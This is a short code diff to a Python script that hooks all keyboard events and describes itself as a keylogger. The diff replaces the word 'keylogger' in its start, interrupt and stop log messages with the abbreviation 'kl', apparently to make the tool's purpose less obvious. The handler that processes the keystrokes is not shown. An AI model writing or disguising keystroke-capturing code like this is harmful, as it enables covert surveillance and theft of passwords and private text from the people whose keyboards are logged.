@@ -42,15 +42,15 @@ def handle_event(event):
 
 def main():
     try:
-        log_to_console("INFO: keylogger started")
+        log_to_console("INFO: kl started")
         keyboard.hook(handle_event)
         keyboard.wait()
     except KeyboardInterrupt:
-        log_to_console("INFO: keylogger interrupted by user")
+        log_to_console("INFO: kl interrupted by user")
     except Exception:
         log_to_console(f"ERROR:\n{traceback.format_exc()}")
     finally:
-        log_to_console("INFO: keylogger stopped")
+        log_to_console("INFO: kl stopped")
 
 if __name__ == "__main__":
     main()
